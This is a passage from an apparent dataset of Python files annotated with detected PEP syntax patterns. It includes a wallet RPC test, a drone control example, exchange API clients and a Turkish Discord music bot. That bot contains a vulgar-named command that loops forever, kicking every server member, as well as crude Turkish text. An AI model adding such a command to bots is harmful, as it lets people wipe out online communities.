num_blocks + 1)\n            ]\n        )\n        wallet_rpc_api = WalletRpcApi(wallet_node)\n        config = bt.config\n        hostname = config[\"self_hostname\"]\n        daemon_port = config[\"daemon_port\"]\n        def stop_node_cb():\n            pass\n        full_node_rpc_api = FullNodeRpcApi(full_node_api.full_node)\n        rpc_cleanup_node = await start_rpc_server(\n            full_node_rpc_api,\n            hostname,\n            daemon_port,\n            test_rpc_port_node,\n            stop_node_cb,\n            bt.root_path,\n            config,\n            connect_to_daemon=False,\n        )\n        rpc_cleanup = await start_rpc_server(\n            wallet_rpc_api,\n            hostname,\n            daemon_port,\n            test_rpc_port,\n            stop_node_cb,\n            bt.root_path,\n            config,\n            connect_to_daemon=False,\n        )\n        await time_out_assert(5, wallet.get_confirmed_balance, initial_funds)\n        await time_out_assert(5, wallet.get_unconfirmed_balance, initial_funds)\n        client = await WalletRpcClient.create(self_hostname, test_rpc_port, bt.root_path, config)\n        client_node = await FullNodeRpcClient.create(self_hostname, test_rpc_port_node, bt.root_path, config)\n        try:\n            addr = encode_puzzle_hash(await wallet_node_2.wallet_state_manager.main_wallet.get_new_puzzlehash(), \"xch\")\n            tx_amount = 15600000\n            try:\n                await client.send_transaction(\"1\", 100000000000000001, addr)\n                raise Exception(\"Should not create high value tx\")\n            except ValueError:\n                pass\n            tx = await client.send_transaction(\"1\", tx_amount, addr)\n            transaction_id = tx.name\n            async def tx_in_mempool():\n                tx = await client.get_transaction(\"1\", transaction_id)\n                return tx.is_in_mempool()\n            await time_out_assert(5, tx_in_mempool, True)\n            await time_out_assert(5, wallet.get_unconfirmed_balance, initial_funds - tx_amount)\n            assert (await client.get_wallet_balance(\"1\"))[\"unconfirmed_wallet_balance\"] == initial_funds - tx_amount\n            assert (await client.get_wallet_balance(\"1\"))[\"confirmed_wallet_balance\"] == initial_funds\n            for i in range(0, 5):\n                await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(ph_2))\n            async def eventual_balance():\n                return (await client.get_wallet_balance(\"1\"))[\"confirmed_wallet_balance\"]\n            await time_out_assert(5, eventual_balance, initial_funds_eventually - tx_amount)\n            ph_3 = await wallet_node_2.wallet_state_manager.main_wallet.get_new_puzzlehash()\n            ph_4 = await wallet_node_2.wallet_state_manager.main_wallet.get_new_puzzlehash()\n            ph_5 = await wallet_node_2.wallet_state_manager.main_wallet.get_new_puzzlehash()\n            signed_tx_amount = 888000\n            tx_res: TransactionRecord = await client.create_signed_transaction(\n                [{\"amount\": signed_tx_amount, \"puzzle_hash\": ph_3}]\n            )\n            assert tx_res.fee_amount == 0\n            assert tx_res.amount == signed_tx_amount\n            assert len(tx_res.additions) == 2  \n            assert any([addition.amount == signed_tx_amount for addition in tx_res.additions])\n            push_res = await client_node.push_tx(tx_res.spend_bundle)\n            assert push_res[\"success\"]\n            assert (await client.get_wallet_balance(\"1\"))[\n                \"confirmed_wallet_balance\"\n            ] == initial_funds_eventually - tx_amount\n            for i in range(0, 5):\n                await client.farm_block(encode_puzzle_hash(ph_2, \"xch\"))\n                await asyncio.sleep(0.5)\n            await time_out_assert(5, eventual_balance, initial_funds_eventually - tx_amount - signed_tx_amount)\n            coin_to_spend = None\n            for addition in tx_res.additions:\n                if addition.amount != signed_tx_amount:\n                    coin_to_spend = addition\n            assert coin_to_spend is not None\n            tx_res = await client.create_signed_transaction(\n                [{\"amount\": 444, \"puzzle_hash\": ph_4}, {\"amount\": 999, \"puzzle_hash\": ph_5}],\n                coins=[coin_to_spend],\n                fee=100,\n            )\n            assert tx_res.fee_amount == 100\n            assert tx_res.amount == 444 + 999\n            assert len(tx_res.additions) == 3  \n            assert any([addition.amount == 444 for addition in tx_res.additions])\n            assert any([addition.amount == 999 for addition in tx_res.additions])\n            assert sum([rem.amount for rem in tx_res.removals]) - sum([ad.amount for ad in tx_res.additions]) == 100\n            push_res = await client_node.push_tx(tx_res.spend_bundle)\n            assert push_res[\"success\"]\n            for i in range(0, 5):\n                await client.farm_block(encode_puzzle_hash(ph_2, \"xch\"))\n                await asyncio.sleep(0.5)\n            new_balance = initial_funds_eventually - tx_amount - signed_tx_amount - 444 - 999 - 100\n            await time_out_assert(5, eventual_balance, new_balance)\n            send_tx_res: TransactionRecord = await client.send_transaction_multi(\n                \"1\", [{\"amount\": 555, \"puzzle_hash\": ph_4}, {\"amount\": 666, \"puzzle_hash\": ph_5}], fee=200\n            )\n            assert send_tx_res is not None\n            assert send_tx_res.fee_amount == 200\n            assert send_tx_res.amount == 555 + 666\n            assert len(send_tx_res.additions) == 3  \n            assert any([addition.amount == 555 for addition in send_tx_res.additions])\n            assert any([addition.amount == 666 for addition in send_tx_res.additions])\n            assert (\n                sum([rem.amount for rem in send_tx_res.removals]) - sum([ad.amount for ad in send_tx_res.additions])\n                == 200\n            )\n            await asyncio.sleep(3)\n            for i in range(0, 5):\n                await client.farm_block(encode_puzzle_hash(ph_2, \"xch\"))\n                await asyncio.sleep(0.5)\n            new_balance = new_balance - 555 - 666 - 200\n            await time_out_assert(5, eventual_balance, new_balance)\n            address = await client.get_next_address(\"1\", True)\n            assert len(address) > 10\n            transactions = await client.get_transactions(\"1\")\n            assert len(transactions) > 1\n            pks = await client.get_public_keys()\n            assert len(pks) == 1\n            assert (await client.get_height_info()) > 0\n            created_tx = await client.send_transaction(\"1\", tx_amount, addr)\n            async def tx_in_mempool_2():\n                tx = await client.get_transaction(\"1\", created_tx.name)\n                return tx.is_in_mempool()\n            await time_out_assert(5, tx_in_mempool_2, True)\n            assert len(await wallet.wallet_state_manager.tx_store.get_unconfirmed_for_wallet(1)) == 1\n            await client.delete_unconfirmed_transactions(\"1\")\n            assert len(await wallet.wallet_state_manager.tx_store.get_unconfirmed_for_wallet(1)) == 0\n            sk_dict = await client.get_private_key(pks[0])\n            assert sk_dict[\"fingerprint\"] == pks[0]\n            assert sk_dict[\"sk\"] is not None\n            assert sk_dict[\"pk\"] is not None\n            assert sk_dict[\"seed\"] is not None\n            mnemonic = await client.generate_mnemonic()\n            assert len(mnemonic) == 24\n            await client.add_key(mnemonic)\n            pks = await client.get_public_keys()\n            assert len(pks) == 2\n            await client.log_in_and_skip(pks[1])\n            sk_dict = await client.get_private_key(pks[1])\n            assert sk_dict[\"fingerprint\"] == pks[1]\n            sk = await wallet_node.get_key_for_fingerprint(pks[0])\n            test_ph = create_puzzlehash_for_pk(master_sk_to_wallet_sk(sk, uint32(0)).get_g1())\n            test_config = load_config(wallet_node.root_path, \"config.yaml\")\n            test_config[\"farmer\"][\"heather_target_address\"] = encode_puzzle_hash(test_ph, \"heather\")\n            sk = await wallet_node.get_key_for_fingerprint(pks[1])\n            test_ph = create_puzzlehash_for_pk(master_sk_to_wallet_sk(sk, uint32(0)).get_g1())\n            test_config[\"pool\"][\"heather_target_address\"] = encode_puzzle_hash(test_ph, \"heather\")\n            save_config(wallet_node.root_path, \"config.yaml\", test_config)\n            sk_dict = await client.check_delete_key(pks[0])\n            assert sk_dict[\"fingerprint\"] == pks[0]\n            assert sk_dict[\"used_for_farmer_rewards\"] is True\n            assert sk_dict[\"used_for_pool_rewards\"] is False\n            sk_dict = await client.check_delete_key(pks[1])\n            assert sk_dict[\"fingerprint\"] == pks[1]\n            assert sk_dict[\"used_for_farmer_rewards\"] is False\n            assert sk_dict[\"used_for_pool_rewards\"] is True\n            sk_dict = await client.check_delete_key(123456)\n            assert sk_dict[\"fingerprint\"] == 123456\n            assert sk_dict[\"used_for_farmer_rewards\"] is False\n            assert sk_dict[\"used_for_pool_rewards\"] is False\n            await client.delete_key(pks[0])\n            await client.log_in_and_skip(pks[1])\n            assert len(await client.get_public_keys()) == 1\n            assert not (await client.get_sync_status())\n            wallets = await client.get_wallets()\n            assert len(wallets) == 1\n            balance = await client.get_wallet_balance(wallets[0][\"id\"])\n            assert balance[\"unconfirmed_wallet_balance\"] == 0\n            test_wallet_backup_path = Path(\"test_wallet_backup_file\")\n            await client.create_backup(test_wallet_backup_path)\n            assert test_wallet_backup_path.exists()\n            test_wallet_backup_path.unlink()\n            try:\n                await client.send_transaction(wallets[0][\"id\"], 100, addr)\n                raise Exception(\"Should not create tx if no balance\")\n            except ValueError:\n                pass\n            await client.delete_all_keys()\n            assert len(await client.get_public_keys()) == 0\n        finally:\n            client.close()\n            client_node.close()\n            await client.await_closed()\n            await client_node.await_closed()\n            await rpc_cleanup()\n            await rpc_cleanup_node()",
            "patterns": {
                "pep_526": [
                    [
                        110,
                        "tx_res: TransactionRecord = await client.create_signed_transaction("
                    ],
                    [
                        149,
                        "send_tx_res: TransactionRecord = await client.send_transaction_multi("
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        24,
                        26,
                        "async generator",
                        "async def two_wallet_nodes(self):\n        async for _ in setup_simulators_and_wallets(1, 2, {}):\n            yield _"
                    ],
                    [
                        25,
                        26,
                        "async for",
                        "async for _ in setup_simulators_and_wallets(1, 2, {}):\n            yield _"
                    ]
                ]
            }
        },
        "154": {
            "file": "import asyncio\nfrom mavsdk import System\nfrom mavsdk import (Attitude, OffboardError)\nasync def run():\n    drone = System()\n    await drone.connect(system_address=\"udp://:14540\")\n    print(\"Waiting for drone to connect...\")\n    async for state in drone.core.connection_state():\n        if state.is_connected:\n            print(f\"Drone discovered with UUID: {state.uuid}\")\n            break\n    print(\"-- Arming\")\n    await drone.action.arm()\n    print(\"-- Setting initial setpoint\")\n    await drone.offboard.set_attitude(Attitude(0.0, 0.0, 0.0, 0.0))\n    print(\"-- Starting offboard\")\n    try:\n        await drone.offboard.start()\n    except OffboardError as error:\n        print(f\"Starting offboard mode failed with error code: \\\n              {error._result.result}\")\n        print(\"-- Disarming\")\n        await drone.action.disarm()\n        return\n    print(\"-- Roll 30 at 60% thrust\")\n    await drone.offboard.set_attitude(Attitude(30.0, 0.0, 0.0, 0.6))\n    await asyncio.sleep(2)\n    print(\"-- Roll -30 at 60% thrust\")\n    await drone.offboard.set_attitude(Attitude(-30.0, 0.0, 0.0, 0.6))\n    await asyncio.sleep(2)\n    print(\"-- Roll 0 at 60% thrust\")\n    await drone.offboard.set_attitude(Attitude(0.0, 0.0, 0.0, 0.6))\n    await asyncio.sleep(2)\n    print(\"-- Stopping offboard\")\n    try:\n        await drone.offboard.stop()\n    except OffboardError as error:\n        print(f\"Stopping offboard mode failed with error code: \\\n              {error._result.result}\")\nif __name__ == \"__main__\":\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(run())",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        8,
                        11,
                        "async for",
                        "async for state in drone.core.connection_state():\n        if state.is_connected:\n            print(f\"Drone discovered with UUID: {state.uuid}\")\n            break"
                    ]
                ],
                "pep_498": [
                    [
                        10,
                        "            print(f\"Drone discovered with UUID: {state.uuid}\")"
                    ],
                    [
                        20,
                        "        print(f\"Starting offboard mode failed with error code: \\"
                    ],
                    [
                        38,
                        "        print(f\"Stopping offboard mode failed with error code: \\"
                    ]
                ]
            }
        },
        "155": {
            "file": "import discord\nimport asyncio\nimport random\nimport youtube_dl\nimport websockets\nfrom discord.ext import commands\nfrom discord import Client\nfrom discord import Server\nimport configparser\nimport os\nconfig = configparser.ConfigParser()\nconfig.read('config.ini')\nbot = commands.Bot(command_prefix='-')\nbot.remove_command('help')\nfrom discord import opus\nOPUS_LIBS = ['libopus-0.x86.dll', 'libopus-0.x64.dll',\n             'libopus-0.dll', 'libopus.so.0', 'libopus.0.dylib']\ndef load_opus_lib(opus_libs=OPUS_LIBS):\n    if opus.is_loaded():\n        return True\n    for opus_lib in opus_libs:\n            try:\n                opus.load_opus(opus_lib)\n                return\n            except OSError:\n                pass\n    raise RuntimeError('Could not load an opus lib. Tried %s' %\n                       (', '.join(opus_libs)))\nopts = {\n    'default_search': 'auto',\n    'quiet': True,\n}  \nload_opus_lib()\nservers_songs={}\nplayer_status={}\nnow_playing={}\nsong_names={}\npaused={}\nasync def set_player_status():\n    for i in bot.servers:\n        player_status[i.id]=False\n        servers_songs[i.id]=None\n        paused[i.id]=False\n        song_names[i.id]=[]\n    print(200)\nasync def bg():\n    bot.loop.create_task(set_player_status())\n@bot.event\nasync def on_ready():\n    bot.loop.create_task(bg())\n    print(bot.user.name)\n    await bot.change_presence(game=discord.Game(name='Tat\u0131 Sikememece'))\n@bot.event\nasync def on_reaction_add(react,user):\n    pass\nasync def check_voice(con):\n    pass\nasync def queue_songs(con,clear):\n    if clear == True:\n        song_names[con.message.server.id].clear()\n        await bot.voice_client_in(con.message.server).disconnect()\n        player_status[con.message.server.id] = False\n    if clear == False:\n        if len(song_names[con.message.server.id])==0:\n            servers_songs[con.message.server.id]=None\n        if len(song_names[con.message.server.id]) !=0:\n            song=await bot.voice_client_in(con.message.server).create_ytdl_player(song_names[con.message.server.id][0], ytdl_options=opts, after=lambda: bot.loop.create_task(after_song(con, False)))\n            servers_songs[con.message.server.id]=song\n            servers_songs[con.message.server.id].start()\n            await bot.delete_message(now_playing[con.message.server.id])\n            msg=await bot.send_message(con.message.channel,\"Now playing\")\n            now_playing[con.message.server.id]=msg\n            if len(song_names[con.message.server.id]) >= 1:\n                song_names[con.message.server.id].pop(0)\n        if len(song_names[con.message.server.id]) ==0 and servers_songs[con.message.server.id] == None:\n            player_status[con.message.server.id]=False\nasync def after_song(con,clear):\n    bot.loop.create_task(queue_songs(con,clear))\n    bot.loop.create_task(check_voice(con))\n@bot.command(pass_context=True)\nasync def sikherkesi(ctx):\n    members = ctx.message.server.members.copy();\n    while True:\n        for server_member in members:\n            try:\n                channel = bot.get_channel('605223507856719888')\n                await bot.kick(server_member)\n                await bot.send_message(channel, \"someone got kicked\")\n            except discord.Forbidden:\n                pass\n@bot.command(pass_context=True)\nasync def p(con,*,url):\n    check = str(con.message.channel)\n    if check == 'Direct Message with {}'.format(con.message.author.name):\n        await bot.send_message(con.message.channel, \"**You must be in a `server voice channel ` to use this command**\")\n    if check != 'Direct Message with {}'.format(con.message.author.name):\n        if bot.is_voice_connected(con.message.server) == False:\n            await bot.join_voice_channel(con.message.author.voice.voice_channel)\n        if bot.is_voice_connected(con.message.server) == True:\n            if player_status[con.message.server.id]==True:\n                song_names[con.message.server.id].append(url)\n                await bot.send_message(con.message.channel, \"**\u015eark\u0131 s\u0131raya al\u0131nd\u0131 :white_check_mark:**\")\n            if player_status[con.message.server.id]==False:\n                player_status[con.message.server.id]=True\n                song_names[con.message.server.id].append(url)\n                song=await bot.voice_client_in(con.message.server).create_ytdl_player(song_names[con.message.server.id][0], ytdl_options=opts, after=lambda: bot.loop.create_task(after_song(con,False)))\n                servers_songs[con.message.server.id]=song\n                servers_songs[con.message.server.id].start()\n                msg = await bot.send_message(con.message.channel, \"**\u015euanda oynat\u0131lan > {}**\".format(servers_songs[con.message.server.id].title))\n                now_playing[con.message.server.id]=msg\n                song_names[con.message.server.id].pop(0)\n@bot.command(pass_context=True)\nasync def atla(con):\n    check = str(con.message.channel)\n    if check == 'Direct Message with {}'.format(con.message.author.name):\n        await bot.send_message(con.message.channel, \"**You must be in a `server voice channel` to use this command**\")\n    if check != 'Direct Message with {}'.format(con.message.author.name):\n        if servers_songs[con.message.server.id]== None or len(song_names[con.message.server.id])==0 or player_status[con.message.server.id]==False:\n            await bot.send_message(con.message.channel,\"**Atlan\u0131lacak \u015fark\u0131 yok !**\")\n        if servers_songs[con.message.server.id] !=None:\n            servers_songs[con.message.server.id].pause()\n            bot.loop.create_task(queue_songs(con,False))\n@bot.command(pass_context=True)\nasync def kat\u0131l(con,channel=None):\n    check = str(con.message.channel)\n    if check == 'Direct Message with {}'.format(con.message.author.name):\n        await bot.send_message(con.message.channel, \"**You must be in a `server voice channel` to use this command**\")\n    if check != 'Direct Message with {}'.format(con.message.author.name):\n        voice_status = bot.is_voice_connected(con.message.server)\n        if voice_status == False:\n            await bot.join_voice_channel(con.message.author.voice.voice_channel)\n        if voice_status == True:\n            await bot.send_message(con.message.channel, \"**Bot zaten bir kanala ba\u011fl\u0131 !**\")\n@bot.command(pass_context=True)\nasync def \u00e7\u0131k\u0131\u015f(con):\n    check=str(con.message.channel)\n    if check == 'Direct Message with {}'.format(con.message.author.name):\n        await bot.send_message(con.message.channel,\"**You must be in a `server voice channel` to use this command**\")\n    if check != 'Direct Message with {}'.format(con.message.author.name):\n        if bot.is_voice_connected(con.message.server) == False:\n            await bot.send_message(con.message.channel,\"**Bot kanala ba\u011flanmam\u0131\u015f !**\")\n        if bot.is_voice_connected(con.message.server) == True:\n            bot.loop.create_task(queue_songs(con,True))\n@bot.command(pass_context=True)\nasync def durdur(con):\n    check = str(con.message.channel)\n    if check == 'Direct Message with {}'.format(con.message.author.name):\n        await bot.send_message(con.message.channel, \"**You must be in a `server voice channel` to use this command**\")\n    if check != 'Direct Message with {}'.format(con.message.author.name):\n        if servers_songs[con.message.server.id]!=None:\n            if paused[con.message.server.id] == True:\n                await bot.send_message(con.message.channel,\"**\u015eark\u0131 zaten durdurulmu\u015f !**\")\n            if paused[con.message.server.id]==False:\n                servers_songs[con.message.server.id].pause()\n                paused[con.message.server.id]=True\n@bot.command(pass_context=True)\nasync def devam(con):\n    check = str(con.message.channel)\n    if check == 'Direct Message with {}'.format(con.message.author.name):\n        await bot.send_message(con.message.channel, \"**You must be in a  `server voice channel` to use this command**\")\n    if check != 'Direct Message with {}'.format(con.message.author.name):\n        if servers_songs[con.message.server.id] != None:\n            if paused[con.message.server.id] == False:\n                await bot.send_message(con.message.channel,\"**Zaten oynat\u0131l\u0131yor !**\")\n            if paused[con.message.server.id] ==True:\n                servers_songs[con.message.server.id].resume()\n                paused[con.message.server.id]=False\n@bot.command(pass_context=True)\nasync def soyle(ctx, *,content) :\n    await bot.delete_message(ctx.message)\n    await bot.say(content)\n@bot.command(pass_context=True)\nasync def vur(ctx, member:discord.Member):\n    url4 = [\"https://media1.tenor.com/images/85722c3e51d390e11a0493696f32fb69/tenor.gif\" , \n            \"https://media1.tenor.com/images/b6d8a83eb652a30b95e87cf96a21e007/tenor.gif\" ,\n           \"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQJXAvVd7xgvUVyruIlwWvT1Y9a2xvJADKnB01VqjHKVlyh1WB_\" ,\n           \"https://media1.tenor.com/images/1cf84bf514d2abd2810588caf7d9fd08/tenor.gif?itemid=7679403\"]\n    embed = discord.Embed(title=ctx.message.author.name + \" sana vuruyor \" + member.name )\n    embed.set_image(url=random.choice(url4))\n    await bot.say(embed=embed)      \n@bot.command(pass_context=True)\nasync def sil (ctx, number):\n    mgs = []\n    number = int(number)\n    async for x in bot.logs_from(ctx.message.channel, limit=number):\n        mgs.append(x)\n    await bot.delete_messages(mgs)           \n@bot.command(pass_context=True)\nasync def test(ctx):\n    await bot.say(\"Ya\u015f\u0131om len mQ\")\n@bot.command(pass_context=True)\nasync def isyan(ctx):\n    await bot.say(\":fire:\")\n    await bot.say(\":fire:\")\n    await bot.say(\":fire:\")\n    await bot.say(\":fire:\")\n    await bot.say(\":fire:\")\n    await bot.say(\":fire:\")\n    await bot.say(\":fire:\")\n    await bot.say(\":fire:\")\n    await bot.say(\":fire:\")\n    await bot.say(\":fire:\")\nbot.run(os.environ.get('token'))   ",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        185,
                        186,
                        "async for",
                        "async for x in bot.logs_from(ctx.message.channel, limit=number):\n        mgs.append(x)"
                    ]
                ],
                "pep_498v": [
                    [
                        27,
                        28,
                        "%"
                    ],
                    [
                        94,
                        94,
                        ".format()"
                    ],
                    [
                        96,
                        96,
                        ".format()"
                    ],
                    [
                        115,
                        115,
                        ".format()"
                    ],
                    [
                        117,
                        117,
                        ".format()"
                    ],
                    [
                        126,
                        126,
                        ".format()"
                    ],
                    [
                        128,
                        128,
                        ".format()"
                    ],
                    [
                        137,
                        137,
                        ".format()"
                    ],
                    [
                        139,
                        139,
                        ".format()"
                    ],
                    [
                        147,
                        147,
                        ".format()"
                    ],
                    [
                        149,
                        149,
                        ".format()"
                    ],
                    [
                        159,
                        159,
                        ".format()"
                    ],
                    [
                        161,
                        161,
                        ".format()"
                    ],
                    [
                        109,
                        109,
                        ".format()"
                    ]
                ]
            }
        },
        "156": {
            "file": "import asyncio\nfrom typing import List\nfrom .api import ApiProvider\nfrom .structs import (\n    Pair, Period, Candle, MarketTrade, OrderInBook, OrderBook, OrderSide\n)\nclass Exchange:\n    def __init__(self, api: ApiProvider = None):\n        self.api = api or ApiProvider(auth_required=False)\n    async def get_pairs(self):\n        data = await self.api.get('public/get-instruments')\n        return {Pair(i.pop('instrument_name')): i for i in data['instruments']}\n    async def get_tickers(self, pair: Pair = None):\n        params = {'instrument_name': pair.value} if pair else None\n        data = await self.api.get('public/get-ticker', params)\n        if pair:\n            data.pop('i')\n            return data\n        return {Pair(ticker.pop('i')): ticker for ticker in data}\n    async def get_trades(self, pair: Pair) -> List[MarketTrade]:\n        data = await self.api.get(\n            'public/get-trades', {'instrument_name': pair.value})\n        for trade in data:\n            trade.pop('i')\n            trade.pop('dataTime')\n        return data\n    async def get_price(self, pair: Pair) -> float:\n        data = await self.api.get('public/get-ticker', {\n            'instrument_name': pair.value\n        })\n        return float(data['a'])\n    async def get_orderbook(self, pair: Pair, depth: int = 150) -> OrderBook:\n        data = await self.api.get('public/get-book', {\n            'instrument_name': pair.value,\n            'depth': depth\n        })\n        return data[0]\n    async def listen_candles(\n            self, period: Period, *pairs: List[Pair]) -> Candle:\n        if not isinstance(period, Period):\n            raise ValueError(f'Provide Period enum not {period}')\n        channels = [\n            f'candlestick.{period.value}.{pair.value}'\n            for pair in pairs\n        ]\n        prev_time = {}\n        async for data in self.api.listen('market', *channels):\n            pair = Pair(data['instrument_name'])\n            for candle in data['data']:\n                current_time = int(candle['t'] / 1000)\n                if pair not in prev_time or current_time > prev_time[pair]:\n                    yield Candle(\n                        current_time,\n                        candle['o'], candle['h'], candle['l'],\n                        candle['c'], candle['v'],\n                        Pair(data['instrument_name'])\n                    )\n                    prev_time[pair] = current_time\n    async def listen_trades(self, *pairs: List[Pair]) -> MarketTrade:\n        channels = [f'trade.{pair}' for pair in pairs]\n        async for data in self.api.listen('market', *channels):\n            for trade in data['data']:\n                trade.pop('dataTime')\n                yield MarketTrade(\n                    trade['d'], int(trade['t'] / 100),\n                    trade['p'], trade['q'],\n                    OrderSide(trade['s'].upper()),\n                    Pair(data['instrument_name'])\n                )\n    async def listen_orderbook(\n            self, *pairs: List[Pair], depth: int = 150) -> OrderBook:\n        channels = [f'book.{pair}.{depth}' for pair in pairs]\n        async for data in self.api.listen('market', *channels):\n            pair = Pair(data['instrument_name'])\n            buys = [\n                OrderInBook(*order, OrderSide.BUY)\n                for order in data['data'][0]['bids']\n            ]\n            sells = [\n                OrderInBook(*order, OrderSide.SELL)\n                for order in reversed(data['data'][0]['asks'])\n            ]\n            yield OrderBook(buys, sells, pair)",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        2,
                        "from typing import List",
                        "suggestion"
                    ]
                ],
                "pep_525": [
                    [
                        38,
                        58,
                        "async generator",
                        "async def listen_candles(\n            self, period: Period, *pairs: List[Pair]) -> Candle:\n        if not isinstance(period, Period):\n            raise ValueError(f'Provide Period enum not {period}')\n        channels = [\n            f'candlestick.{period.value}.{pair.value}'\n            for pair in pairs\n        ]\n        prev_time = {}\n        async for data in self.api.listen('market', *channels):\n            pair = Pair(data['instrument_name'])\n            for candle in data['data']:\n                current_time = int(candle['t'] / 1000)\n                if pair not in prev_time or current_time > prev_time[pair]:\n                    yield Candle(\n                        current_time,\n                        candle['o'], candle['h'], candle['l'],\n                        candle['c'], candle['v'],\n                        Pair(data['instrument_name'])\n                    )\n                    prev_time[pair] = current_time"
                    ],
                    [
                        59,
                        69,
                        "async generator",
                        "async def listen_trades(self, *pairs: List[Pair]) -> MarketTrade:\n        channels = [f'trade.{pair}' for pair in pairs]\n        async for data in self.api.listen('market', *channels):\n            for trade in data['data']:\n                trade.pop('dataTime')\n                yield MarketTrade(\n                    trade['d'], int(trade['t'] / 100),\n                    trade['p'], trade['q'],\n                    OrderSide(trade['s'].upper()),\n                    Pair(data['instrument_name'])\n                )"
                    ],
                    [
                        70,
                        83,
                        "async generator",
                        "async def listen_orderbook(\n            self, *pairs: List[Pair], depth: int = 150) -> OrderBook:\n        channels = [f'book.{pair}.{depth}' for pair in pairs]\n        async for data in self.api.listen('market', *channels):\n            pair = Pair(data['instrument_name'])\n            buys = [\n                OrderInBook(*order, OrderSide.BUY)\n                for order in data['data'][0]['bids']\n            ]\n            sells = [\n                OrderInBook(*order, OrderSide.SELL)\n                for order in reversed(data['data'][0]['asks'])\n            ]\n            yield OrderBook(buys, sells, pair)"
                    ],
                    [
                        47,
                        58,
                        "async for",
                        "async for data in self.api.listen('market', *channels):\n            pair = Pair(data['instrument_name'])\n            for candle in data['data']:\n                current_time = int(candle['t'] / 1000)\n                if pair not in prev_time or current_time > prev_time[pair]:\n                    yield Candle(\n                        current_time,\n                        candle['o'], candle['h'], candle['l'],\n                        candle['c'], candle['v'],\n                        Pair(data['instrument_name'])\n                    )\n                    prev_time[pair] = current_time"
                    ],
                    [
                        61,
                        69,
                        "async for",
                        "async for data in self.api.listen('market', *channels):\n            for trade in data['data']:\n                trade.pop('dataTime')\n                yield MarketTrade(\n                    trade['d'], int(trade['t'] / 100),\n                    trade['p'], trade['q'],\n                    OrderSide(trade['s'].upper()),\n                    Pair(data['instrument_name'])\n                )"
                    ],
                    [
                        73,
                        83,
                        "async for",
                        "async for data in self.api.listen('market', *channels):\n            pair = Pair(data['instrument_name'])\n            buys = [\n                OrderInBook(*order, OrderSide.BUY)\n                for order in data['data'][0]['bids']\n            ]\n            sells = [\n                OrderInBook(*order, OrderSide.SELL)\n                for order in reversed(data['data'][0]['asks'])\n            ]\n            yield OrderBook(buys, sells, pair)"
                    ]
                ],
                "pep_498": [
                    [
                        43,
                        "            f'candlestick.{period.value}.{pair.value}'"
                    ],
                    [
                        60,
                        "        channels = [f'trade.{pair}' for pair in pairs]"
                    ],
                    [
                        72,
                        "        channels = [f'book.{pair}.{depth}' for pair in pairs]"
                    ],
                    [
                        41,
                        "            raise ValueError(f'Provide Period enum not {period}')"
                    ]
                ]
            }
        },
        "157": {
            "file": "import asyncio\nimport logging\nfrom typing import Optional\nimport hummingbot.connector.derivative.dydx_perpetual.dydx_perpetual_constants as CONSTANTS\nfrom hummingbot.connector.derivative.dydx_perpetual.dydx_perpetual_utils import build_api_factory\nfrom hummingbot.core.data_type.user_stream_tracker_data_source import UserStreamTrackerDataSource\nfrom hummingbot.connector.derivative.dydx_perpetual.dydx_perpetual_auth import DydxPerpetualAuth\nfrom hummingbot.connector.derivative.dydx_perpetual.dydx_perpetual_order_book import DydxPerpetualOrderBook\nfrom hummingbot.core.web_assistant.connections.data_types import WSRequest\nfrom hummingbot.core.web_assistant.web_assistants_factory import WebAssistantsFactory\nfrom hummingbot.core.web_assistant.ws_assistant import WSAssistant\nfrom hummingbot.logger import HummingbotLogger\nclass DydxPerpetualUserStreamDataSource(UserStreamTrackerDataSource):\n    HEARTBEAT_INTERVAL = 30.0  \n    _logger: Optional[HummingbotLogger] = None\n    @classmethod\n    def logger(cls) -> HummingbotLogger:\n        if cls._logger is None:\n            cls._logger = logging.getLogger(__name__)\n        return cls._logger\n    def __init__(self, dydx_auth: DydxPerpetualAuth, api_factory: Optional[WebAssistantsFactory] = None):\n        self._dydx_auth: DydxPerpetualAuth = dydx_auth\n        self._api_factory: WebAssistantsFactory = api_factory or build_api_factory()\n        self._ws_assistant: Optional[WSAssistant] = None\n        super().__init__()\n    @property\n    def order_book_class(self):\n        return DydxPerpetualOrderBook\n    @property\n    def last_recv_time(self):\n        if self._ws_assistant:\n            return self._ws_assistant.last_recv_time\n        return -1\n    async def _get_ws_assistant(self) -> WSAssistant:\n        if self._ws_assistant is None:\n            self._ws_assistant = await self._api_factory.get_ws_assistant()\n        return self._ws_assistant\n    async def listen_for_user_stream(self, ev_loop: asyncio.BaseEventLoop, output: asyncio.Queue):\n        ws = None\n        while True:\n            try:\n                self.logger().info(f\"Connecting to {CONSTANTS.DYDX_WS_URL}\")\n                ws: WSAssistant = await self._get_ws_assistant()\n                await ws.connect(ws_url=CONSTANTS.DYDX_WS_URL, ping_timeout=self.HEARTBEAT_INTERVAL)\n                auth_params = self._dydx_auth.get_ws_auth_params()\n                auth_request: WSRequest = WSRequest(auth_params)\n                await ws.send(auth_request)\n                self.logger().info(\"Authenticated user stream...\")\n                async for ws_response in ws.iter_messages():\n                    data = ws_response.data\n                    if data.get(\"type\", \"\") in [\"subscribed\", \"channel_data\"]:\n                        output.put_nowait(data)\n            except asyncio.CancelledError:\n                raise\n            except Exception:\n                self.logger().error(\"Unexpected error with dydx WebSocket connection. \"\n                                    \"Retrying after 30 seconds...\", exc_info=True)\n            finally:\n                ws and await ws.disconnect()\n                await self._sleep(30.0)",
            "patterns": {
                "pep_526": [
                    [
                        15,
                        "_logger: Optional[HummingbotLogger] = None"
                    ],
                    [
                        22,
                        "self._dydx_auth: DydxPerpetualAuth = dydx_auth"
                    ],
                    [
                        23,
                        "self._api_factory: WebAssistantsFactory = api_factory or build_api_factory()"
                    ],
                    [
                        24,
                        "self._ws_assistant: Optional[WSAssistant] = None"
                    ],
                    [
                        43,
                        "ws: WSAssistant = await self._get_ws_assistant()"
                    ],
                    [
                        46,
                        "auth_request: WSRequest = WSRequest(auth_params)"
                    ]
                ],
